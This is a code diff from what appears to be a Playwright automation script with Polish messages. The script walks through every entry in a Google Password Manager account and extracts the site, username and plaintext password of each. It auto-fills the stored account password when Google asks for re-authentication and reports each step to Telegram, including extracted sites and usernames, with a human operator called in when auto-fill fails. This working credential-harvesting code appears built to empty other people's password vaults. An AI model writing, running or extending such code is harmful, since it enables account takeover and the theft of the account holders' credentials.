@@ -1252,29 +1252,39 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
       });
     }
 
+    const dbg = (msg) => telegram.sendMessage(`🐛 [${accountId}] ${msg}`).catch(() => {});
+
     for (let i = 0; i < total; i++) {
       try {
-        // Grab href before clicking so we can re-navigate after a challenge
+        await dbg(`wpis ${i + 1}/${total} — szukam linka...`);
         const link = page.locator('a[href^="password/"]').nth(i);
         await link.scrollIntoViewIfNeeded().catch(() => {});
         const entryHref = await link.getAttribute('href').catch(() => null);
-        const entryUrl = entryHref ? `https://passwords.google.com/${entryHref}` : null;
+        await dbg(`klikam: ${entryHref || '(brak href)'}`);
         await link.click({ timeout: 8000 });
         await page.waitForTimeout(1500);
+        await dbg(`po kliknięciu URL: ${page.url()}`);
 
         // Guard: if Google redirected to auth/challenge, handle robustly
         if (isAuthPage(page.url())) {
-          // 1st attempt: fill password automatically
+          await dbg(`AUTH wykryty: ${page.url()}`);
           if (acc?.password) {
             const pwInp = page.locator('input[type="password"]').first();
-            if (await pwInp.count()) {
+            const pwCount = await pwInp.count();
+            await dbg(`input[type=password] count=${pwCount}`);
+            if (pwCount) {
               await pwInp.fill(acc.password);
+              await dbg('hasło wpisane, klikam Dalej...');
               await clickDalej(page);
               await page.waitForTimeout(2000);
+              await dbg(`po Dalej URL: ${page.url()}`);
             }
+          } else {
+            await dbg('BRAK acc.password — nie mogę auto-wpisać');
           }
-          // 2nd check: still on auth → notify and wait for human
+
           if (isAuthPage(page.url())) {
+            await dbg(`nadal na auth po auto-fill: ${page.url()} — czekam na człowieka`);
             stopScreenshots();
             await snap();
             await telegram.sendMessage(
@@ -1288,8 +1298,8 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
             ).catch(() => {});
             startScreenshots();
             await snap();
-            // If still stuck on auth after wait, skip this entry
             if (isAuthPage(page.url())) {
+              await dbg(`timeout auth — pomijam wpis ${i + 1}`);
               results.push(`wpis-${i + 1} | (pominięty — auth timeout)`);
               if (onProgress) onProgress(results.length, total);
               await gotoTolerant('https://passwords.google.com/');
@@ -1297,33 +1307,41 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
               continue;
             }
           }
+
+          await dbg(`auth zdany, URL teraz: ${page.url()}`);
           // After challenge Google redirects to list, NOT to the entry detail.
           // Re-click via SPA (NOT page.goto — that would trigger another challenge).
           if (!page.url().includes('/password/')) {
+            await dbg('redirect na listę — re-klikam wpis przez SPA');
             const reLink = page.locator('a[href^="password/"]').nth(i);
             await reLink.scrollIntoViewIfNeeded().catch(() => {});
             await reLink.click({ timeout: 8000 }).catch(() => {});
             await page.waitForTimeout(1500);
+            await dbg(`po re-klik URL: ${page.url()}`);
           }
         }
 
         // Wait for shadow DOM to fully populate
         await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
         const detailUrl = page.url();
+        await dbg(`strona szczegółów: ${detailUrl}`);
         const data = await extractFromDetailPage();
+        await dbg(`wyciągnięto — site="${data.site}" user="${data.user}" pw="${data.pw ? '***' : '(puste)'}"`);
 
         // Navigate back to list (SPA history)
         await page.goBack({ waitUntil: 'domcontentloaded', timeout: 10000 })
           .catch(() => page.goto('https://passwords.google.com/', { waitUntil: 'domcontentloaded', timeout: 15000 }));
         await page.waitForTimeout(600);
+        await dbg(`wróciłem na listę: ${page.url()}`);
 
-        // Use the detail page URL as site fallback so results are still useful
         const site = data.site || (detailUrl.includes('passwords.google.com/password/') ? `entry-${i + 1}` : detailUrl) || `wpis-${i + 1}`;
         const user = data.user || '';
         const pw = data.pw || '(nie udało się)';
         results.push(`${site} | ${user} | ${pw}`);
         if (onProgress) onProgress(results.length, total);
-      } catch { /* skip entry */ }
+      } catch (err) {
+        await dbg(`❌ WYJĄTEK wpis ${i + 1}: ${err.message}`);
+      }
     }
 
     if (!results.length) throw new Error('Nie udało się wyciągnąć żadnych haseł ze stron szczegółów');
